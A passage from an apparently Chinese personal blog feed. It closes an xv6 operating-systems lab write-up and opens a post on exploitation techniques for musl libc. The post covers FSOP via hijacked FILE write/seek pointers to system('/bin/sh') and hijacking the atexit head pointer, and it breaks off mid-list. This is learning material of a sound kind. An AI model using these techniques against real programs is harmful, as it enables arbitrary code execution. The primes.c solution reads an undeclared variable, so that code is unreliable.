p[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(read(p[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            pid = getpid();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received ping\n&quot;</span>, pid);</span><br><span class="line">            write(p[<span class="number">1</span>], <span class="string">&quot;L&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        write(p[<span class="number">1</span>], <span class="string">&quot;H&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(read(p[<span class="number">0</span>], <span class="number">0</span>, <span class="number">1</span>)) &#123;</span><br><span class="line">            pid = getpid();</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d: received pong\n&quot;</span>, pid);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="primes"><a href="#primes" class="headerlink" title="primes"></a>primes</h2><p>有点难度，想了好久，感觉是要用递归，但是没想出来怎么写</p><p>想到在看网课的时候，进入子进程先把 <code>close(0)</code>，然后 <code>dup(p[1])</code>，也就是把子进程的标准输入改为管道的输入了，这样就容易写递归了</p><p>每次只输出接收到的第一个数，它必然是素数</p><p>当从输入接收不到 prime 的时候 <code>exit(0)</code></p><p>这里注意 <code>dup(p[1])</code> 后要把管道都给关了</p><figure class="highlight c"><figcaption><span>user/primes.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPrime</span><span class="params">(<span class="type">int</span> prime)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">primes</span><span class="params">(<span class="type">int</span> start)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    primes(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printPrime</span><span class="params">(<span class="type">int</span> prime)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prime %d\n&quot;</span>, prime);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">primes</span><span class="params">(<span class="type">int</span> start)</span> &#123;</span><br><span class="line">    <span class="type">int</span> prime = <span class="number">2</span>;</span><br><span class="line">    <span class="type">int</span> n, pid, p[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!start &amp;&amp; read(<span class="number">0</span>, &amp;prime, <span class="keyword">sizeof</span>(prime)) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printPrime(prime);</span><br><span class="line"></span><br><span class="line">    pipe(p);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// p[0] =&gt; stdin</span></span><br><span class="line">        close(<span class="number">0</span>);</span><br><span class="line">        dup(p[<span class="number">0</span>]);</span><br><span class="line">        close(p[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// do not need p[1]</span></span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        primes(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(start == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>; i &lt;= <span class="number">35</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i % prime != <span class="number">0</span>) &#123;</span><br><span class="line">                    write(p[<span class="number">1</span>], &amp;i, <span class="keyword">sizeof</span>(i));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;n, <span class="keyword">sizeof</span>(n))) &#123;</span><br><span class="line">                <span class="keyword">if</span>(i % prime != <span class="number">0</span>) &#123;</span><br><span class="line">                    write(p[<span class="number">1</span>], &amp;n, <span class="keyword">sizeof</span>(n));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        close(p[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// wait for child process</span></span><br><span class="line">        <span class="type">int</span> status;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        <span class="built_in">exit</span>(status);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>同样也是递归，从目录里查找文件可以参考 <code>./user/ls.c</code></p><p>当找的是文件或者时比较名字</p><p>当找的是目录时，从 fd 读取 <code>struct dirent[]</code>，表示目录下的每个文件，里面有 name，表示文件名，注意过滤 <code>.</code> 和 <code>..</code></p><figure class="highlight c"><figcaption><span>user/find.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fcntl.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/fs.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *filename)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: invalid arguments\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> status = find(argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">char</span> *path, <span class="type">char</span> *filename)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">512</span>];</span><br><span class="line">    <span class="type">char</span> *name, *p;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> <span class="title">de</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>((fd = open(path, O_RDONLY)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: cannot open %s\n&quot;</span>, path);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(fstat(fd, &amp;st) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;find: cannot stat %s\n&quot;</span>, path);</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (st.type) &#123;</span><br><span class="line">        <span class="keyword">case</span> T_DEVICE:</span><br><span class="line">        <span class="keyword">case</span> T_FILE:</span><br><span class="line">            name = path;</span><br><span class="line">            <span class="comment">// get position of filename</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = <span class="built_in">strlen</span>(path) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                <span class="keyword">if</span>(path[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                    name = &amp;path[i+<span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(name, filename)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if path is directory</span></span><br><span class="line">        <span class="keyword">case</span> T_DIR:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strlen</span>(path)+<span class="number">1</span>+DIRSIZ+<span class="number">1</span> &gt; <span class="keyword">sizeof</span>(buf)) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;find: path too long\n&quot;</span>);</span><br><span class="line">                close(fd);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">strcpy</span>(buf, path);</span><br><span class="line">            p = buf + <span class="built_in">strlen</span>(buf);</span><br><span class="line">            *p++ = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">            <span class="keyword">while</span>(read(fd, &amp;de, <span class="keyword">sizeof</span>(de)) == <span class="keyword">sizeof</span>(de)) &#123;</span><br><span class="line">                <span class="comment">// excpet for &quot;.&quot; and &quot;..&quot;</span></span><br><span class="line">                <span class="keyword">if</span>(de.inum == <span class="number">0</span> || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;.&quot;</span>) || !<span class="built_in">strcmp</span>(de.name, <span class="string">&quot;..&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                memmove(p, de.name, DIRSIZ);</span><br><span class="line">                p[DIRSIZ] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                find(buf, filename);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="xargs"><a href="#xargs" class="headerlink" title="xargs"></a>xargs</h2><p>一开始没懂 <code>sh</code> 怎么实现管道</p><p>测试发现就是将管道的读端作为 <code>|</code> 右边程序的标准输入</p><p>主要是判断什么时候跳出循环</p><figure class="highlight c"><figcaption><span>user/xargs.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> status, pid, new_argc;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> buf;</span><br><span class="line">    <span class="type">char</span> *new_argv[MAXARG];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; argc; i++) &#123;</span><br><span class="line">        new_argv[i<span class="number">-1</span>] = argv[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>)) &#123;</span><br><span class="line">        new_argc = argc;</span><br><span class="line">        idx = <span class="number">0</span>;</span><br><span class="line">        new_argv[new_argc<span class="number">-1</span>] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXARG);</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">// only read one line each time</span></span><br><span class="line">            <span class="keyword">if</span>(buf == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>][idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                new_argv[new_argc] = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(buf == <span class="string">&#x27; &#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// if meet &#x27; &#x27;, divide into more argv</span></span><br><span class="line">                <span class="comment">// except for two &#x27; &#x27;</span></span><br><span class="line">                <span class="keyword">if</span>(idx == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>][idx] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">                new_argc++;</span><br><span class="line">                idx = <span class="number">0</span>;</span><br><span class="line">                new_argv[new_argc<span class="number">-1</span>] = (<span class="type">char</span>*)<span class="built_in">malloc</span>(MAXARG);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            new_argv[new_argc<span class="number">-1</span>][idx++] = buf;</span><br><span class="line">        &#125; <span class="keyword">while</span>(read(<span class="number">0</span>, &amp;buf, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">            exec(new_argv[<span class="number">0</span>], new_argv);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;wrong command\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = argc; i &lt;= new_argc; i++) &#123;</span><br><span class="line">            <span class="built_in">free</span>(new_argv[i<span class="number">-1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(status);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="写一个-uptime-程序来调用-uptime-系统调用"><a href="#写一个-uptime-程序来调用-uptime-系统调用" class="headerlink" title="写一个 uptime 程序来调用 uptime 系统调用"></a>写一个 uptime 程序来调用 uptime 系统调用</h3><p>直接调用 uptime 然后打印返回值就好了</p><h3 id="对-grep-实现正则匹配"><a href="#对-grep-实现正则匹配" class="headerlink" title="对 grep 实现正则匹配"></a>对 grep 实现正则匹配</h3><p>yysy，对正则表达式不是很了解</p><h3 id="改造-sh"><a href="#改造-sh" class="headerlink" title="改造 sh"></a>改造 sh</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;开学！&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022 Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022-Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Musl libc Exploration</title>
    <link href="https://humoooor.cn/2022/10/11/Musl%20libc%20Exploration/"/>
    <id>https://humoooor.cn/2022/10/11/Musl%20libc%20Exploration/</id>
    <published>2022-10-11T08:41:00.000Z</published>
    <updated>2023-10-04T11:46:26.740Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新（或许）</p><span id="more"></span><p>环境：x64 musl-1.2.2</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="FILE-结构"><a href="#FILE-结构" class="headerlink" title="FILE 结构"></a>FILE 结构</h3><figure class="highlight c"><figcaption><span>./src/internal/stdio_impl.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line"><span class="type">int</span> (*close)(FILE *);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line"><span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line"><span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line"><span class="type">size_t</span> buf_size;</span><br><span class="line">FILE *prev, *next;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">int</span> pipe_pid;</span><br><span class="line"><span class="type">long</span> lockcount;</span><br><span class="line"><span class="type">int</span> mode;</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line"><span class="type">int</span> lbf;</span><br><span class="line"><span class="type">void</span> *cookie;</span><br><span class="line"><span class="type">off_t</span> off;</span><br><span class="line"><span class="type">char</span> *getln_buf;</span><br><span class="line"><span class="type">void</span> *mustbezero_2;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line"><span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">FILE *prev_locked, *next_locked;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>相比 glibc 的 FILE 结构，musl libc 的 FILE 结构更加简单，也更容易利用</p><p>有四类 FILE 指针：ofl_head、stdin、stdout、stderr</p><ul><li>ofl_head<ul><li>类似 glibc 的 _IO_list_all，打开的文件链表头，为全局变量</li><li>可以直接劫持到伪造的 FILE 结构</li></ul></li><li>stdin、stdout、stderr<ul><li>固定的三个 FILE 指针，不可劫持</li><li>可以更改其指向的内存空间</li></ul></li></ul><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><figure class="highlight c"><figcaption><span>./src/stdio/__stdio_exit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">FFINALLOCK(f);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">FILE *f;</span><br><span class="line"><span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">close_file(__stdin_used);</span><br><span class="line">close_file(__stdout_used);</span><br><span class="line">close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>exit()</code> 时会调用 <code>__stdio_exit()</code> ，其中 <code>close_file()</code> 会调用 FILE 的两个函数 <code>write</code> 和 <code>seek</code></p><p>FSOP 条件</p><ul><li>f-&gt;lock == 0<ul><li>不为 0 会调用 futex 系统调用，然后寄了</li></ul></li><li>flags == “/bin/sh\x00”<ul><li>调用的第一个参数都是 FILE 指针，在劫持为 <code>system</code> 时，将 flags 改为 <code>/bin/sh\x00</code> 即可</li></ul></li><li>调用 write<ul><li>wpo != wbase</li></ul></li><li>调用 seek<ul><li>rpos != rend</li></ul></li></ul><h2 id="exit-hijack"><a href="#exit-hijack" class="headerlink" title="exit hijack"></a>exit hijack</h2><p>🐧师傅提及的</p><p>笔者自己起的名（</p><figure class="highlight c"><figcaption><span>./src/exit/atexit.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> COUNT 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">fl</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fl</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> (*f[COUNT])(<span class="type">void</span> *);</span><br><span class="line"><span class="type">void</span> *a[COUNT];</span><br><span class="line">&#125; builtin, *head;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> slot;</span><br><span class="line"><span class="type">static</span> <span class="keyword">volatile</span> <span class="type">int</span> lock[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">volatile</span> <span class="type">int</span> *<span class="type">const</span> __atexit_lockptr = lock;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __funcs_on_exit()</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">void</span> (*func)(<span class="type">void</span> *), *arg;</span><br><span class="line">LOCK(lock);</span><br><span class="line"><span class="keyword">for</span> (; head; head=head-&gt;next, slot=COUNT) <span class="keyword">while</span>(slot--&gt;<span class="number">0</span>) &#123;</span><br><span class="line">func = head-&gt;f[slot];</span><br><span class="line">arg = head-&gt;a[slot];</span><br><span class="line">UNLOCK(lock);</span><br><span class="line">func(arg);</span><br><span class="line">LOCK(lock);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>exit</code>() 时，会调用 <code>__funs_on_exit()</code> 通过 head 指针执行注册的终止函数</p><p>利用条件</p><ul><li>将 head 劫持到可控内存空间<ul><li>第一个循环因为 slot == 0，会直接跳过</li><li>从而 head  = head-&gt;next</li></ul></li><li>*(head-&gt;next + 0x100) ==  addr_system</li><li>*(head-&gt;next + 0x200) == 